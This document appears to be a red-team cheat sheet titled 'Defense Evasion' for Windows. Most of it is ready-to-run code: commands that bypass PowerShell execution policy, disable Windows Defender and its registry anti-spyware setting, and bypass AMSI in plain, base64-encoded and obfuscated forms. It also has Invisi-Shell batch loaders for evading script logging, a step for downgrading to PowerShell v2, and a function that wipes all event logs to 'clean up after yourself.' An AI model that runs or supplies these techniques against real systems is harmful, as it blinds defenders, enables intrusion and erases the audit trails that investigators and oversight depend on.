# Defense Evasion

## Bypassing Execution Policy

		powershell -ExecutionPolicy bypass
		powershell -c <cmd>
		powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"


## Windows Defender
### Disable Windows Defender
In PowerShell, the following 2 commands with *Admin privilege*:
 
	Set-MpPreference -DisableRealtimeMonitoring $true -force
	Set-MpPreference -DisableIOAVProtection $true
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

## Path Exclusion

Check that path from which Windows Defender allows execusion.

`Get-MpPreference | Select-Object -ExpandProperty ExclusionPath` 

## Windows Firewall
### Creating rules
TODO

## Bypass AMSI

Article showing multiple methods https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/

AMSI is short for Antimalware Scan Interface.

The goal of AMSI is to prevent the execution of arbitrary code containing malicious content.

### Basic - Forcing an AMSI Initialization Failure

Likely detectable

`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`

Base64 Encoded

```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### Obfuscation

#### Obfuscated Command 1

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

#### Obfuscated Command 2

```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" - f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation .'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" - f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```


### Invoke-AMSIBypass

https://raw.githubusercontent.com/samratashok/nishang/master/Bypass/Invoke-AmsiBypass.ps1

`. .\Invoke-AmsiBypass.ps1`

Or copy the code from github and paste it directly into the powershell console

`Invoke-AmsiBypass -Verbose`

## Invisi-Shell

Project https://github.com/OmerYa/Invisi-Shell

Hide your powershell script in plain sight! Invisi-Shell bypasses all of Powershell security features (ScriptBlock logging, Module logging, Transcription, AMSI) by hooking .Net assemblies. The hook is performed via CLR Profiler API.

*Paste in cmd or run as .bat*

### RunWithPathAsAdmin.bat

```
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll

powershell

set COR_ENABLE_PROFILING=
set COR_PROFILER=
set COR_PROFILER_PATH=
```

### RunWithRegistryNonAdmin.bat

```
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InvisiShellProfiler.dll" /f

powershell

set COR_ENABLE_PROFILING=
set COR_PROFILER=
REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
```

## Downgrading PowerShell

Sometimes you need to downgrade powershell as new versions come are more secure

`powershell.exe -version 2`

`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 2`

checking version

`$PSVersionTable`

## Powershell Obfuscators

**Invoke-Obfuscation** is a PowerShell v2.0+ compatible PowerShell command and script obfuscator.

https://github.com/danielbohannon/Invoke-Obfuscation

**Invoke-Stealth** is a Simple & Powerful PowerShell Script Obfuscator.

https://github.com/JoelGMSec/Invoke-Stealth

**Powerob** An on-the-fly Powershell script obfuscator meant for red team engagements. 

 Tutorial https://medium.com/@ammadb/invoke-obfuscation-hiding-payloads-to-avoid-detection-87de291d61d3

https://github.com/cwolff411/powerob


## Scanning Scripts for Detection

### DefenderCheck

https://github.com/matterpreter/DefenderCheck

### AMSITrigger

https://github.com/RythmStick/AMSITrigger

## Clear Event Logs

Clean up after yourself

*Required admin privilege*

```
function clear-all-event-logs ($computerName="localhost")
{
   $logs = Get-EventLog -ComputerName $computername -List | ForEach-Object {$_.Log}
   $logs | ForEach-Object {Clear-EventLog -ComputerName $computername -LogName $_ }
   Get-EventLog -ComputerName $computername -list
}

clear-all-event-logs -ComputerName <hostname>
```

Expected output

```
Max(K) Retain OverflowAction        Entries Log
------ ------ --------------        ------- ---
15,168      0 OverwriteAsNeeded           0 Application
15,168      0 OverwriteAsNeeded           0 DFS Replication
512         7 OverwriteOlder              0 DxStudio
20,480      0 OverwriteAsNeeded           0 Hardware Events
512         7 OverwriteOlder              0 Internet Explorer
20,480      0 OverwriteAsNeeded           0 Key Management Service
16,384      0 OverwriteAsNeeded           0 Microsoft Office Diagnostics
16,384      0 OverwriteAsNeeded           0 Microsoft Office Sessions
30,016      0 OverwriteAsNeeded           1 Security
15,168      0 OverwriteAsNeeded           2 System
15,360      0 OverwriteAsNeeded           0 Windows PowerShell
```